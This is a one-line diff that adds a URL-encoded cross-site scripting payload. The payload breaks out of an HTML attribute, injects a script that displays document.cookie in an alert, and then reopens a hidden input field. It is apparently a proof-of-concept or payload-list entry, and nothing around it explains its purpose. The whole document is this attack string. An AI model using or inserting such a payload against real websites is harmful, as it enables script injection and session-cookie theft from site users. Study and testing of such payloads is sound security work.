@@ -1,0 +1,1 @@
+"><script>alert("cookie"+%2B+document.cookie)<%2Fscript><input type="hidden
